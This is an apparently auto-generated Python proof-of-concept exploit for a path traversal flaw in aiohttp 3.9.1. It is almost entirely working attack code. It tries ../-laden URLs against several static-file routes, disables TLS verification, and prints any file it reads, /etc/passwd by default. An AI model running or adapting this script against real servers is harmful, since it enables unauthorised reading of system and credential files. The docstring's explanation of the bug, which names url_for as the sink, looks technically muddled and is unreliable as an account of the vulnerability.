#!/usr/bin/env python3
# PoC for aiohttp-3.9.1 (/tmp/aiohttp-3.9.1)
# Path: lfi-011
# Sink: url_for
# Auto-generated — run with: python3 lfi_url_method_constructs_using_url_for.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for aiohttp 3.9.1 LFI vulnerability.

Vulnerability: Path traversal in static file handler when follow_symlinks=True (default).
The url_for method joins user-controlled filename with the static directory,
resolves symlinks, but skips the relative_to check when follow_symlinks is True.
This allows reading arbitrary files via ../ sequences.

Usage:
    python3 poc.py --target http://localhost:8080 --file /etc/passwd
"""

import argparse
import sys
import urllib.request
import urllib.error
import ssl

def exploit(target_url: str, file_path: str, timeout: int = 10) -> str:
    """
    Attempt to read an arbitrary file via path traversal.
    
    Args:
        target_url: Base URL of the vulnerable aiohttp server
        file_path: Absolute path of file to read (e.g., /etc/passwd)
        timeout: Request timeout in seconds
    
    Returns:
        File contents as string
    
    Raises:
        Exception: If request fails or unexpected response
    """
    # The static file endpoint is typically at /static/ or similar
    # We need to traverse up from the static directory to reach /
    # Using multiple ../ sequences to ensure we escape the static directory
    
    # Construct traversal payload
    # We need enough ../ to escape the static directory
    # Typically static files are served from /static/ so we need ../../
    # But we'll use a generous amount to be safe
    traversal = "../../../../../../../../../../"
    
    # Build the full URL with the file path
    # The filename is joined with the static directory, so we need to
    # traverse back to root first
    payload = traversal + file_path.lstrip("/")
    
    # URL encode the payload
    encoded_payload = urllib.parse.quote(payload, safe="/")
    
    # Construct the full URL
    # The static endpoint is typically /static/ but could be different
    # We'll try common patterns
    urls_to_try = [
        f"{target_url.rstrip('/')}/static/{encoded_payload}",
        f"{target_url.rstrip('/')}/assets/{encoded_payload}",
        f"{target_url.rstrip('/')}/files/{encoded_payload}",
        f"{target_url.rstrip('/')}/{encoded_payload}",
    ]
    
    last_error = None
    
    for url in urls_to_try:
        try:
            print(f"[*] Trying: {url}")
            
            # Create request with timeout
            req = urllib.request.Request(url)
            
            # Disable SSL verification for testing
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as response:
                content = response.read().decode('utf-8', errors='replace')
                
                if response.status == 200 and content:
                    print(f"[+] Success! Status: {response.status}")
                    print(f"[+] Response length: {len(content)} bytes")
                    return content
                else:
                    print(f"[-] Got status {response.status} but empty response")
                    
        except urllib.error.HTTPError as e:
            last_error = e
            print(f"[-] HTTP {e.code}: {e.reason}")
        except urllib.error.URLError as e:
            last_error = e
            print(f"[-] URL Error: {e.reason}")
        except Exception as e:
            last_error = e
            print(f"[-] Error: {e}")
    
    raise Exception(f"All attempts failed. Last error: {last_error}")

def main():
    parser = argparse.ArgumentParser(
        description="PoC for aiohttp 3.9.1 LFI vulnerability"
    )
    parser.add_argument(
        "--target",
        required=True,
        help="Target URL (e.g., http://localhost:8080)"
    )
    parser.add_argument(
        "--file",
        default="/etc/passwd",
        help="File to read (default: /etc/passwd)"
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Request timeout in seconds (default: 10)"
    )
    
    args = parser.parse_args()
    
    print(f"[*] Target: {args.target}")
    print(f"[*] File: {args.file}")
    print("[*] Attempting path traversal exploit...")
    print()
    
    try:
        content = exploit(args.target, args.file, args.timeout)
        print()
        print("=" * 60)
        print("FILE CONTENTS:")
        print("=" * 60)
        print(content)
        print("=" * 60)
        
    except Exception as e:
        print(f"\n[!] Exploit failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
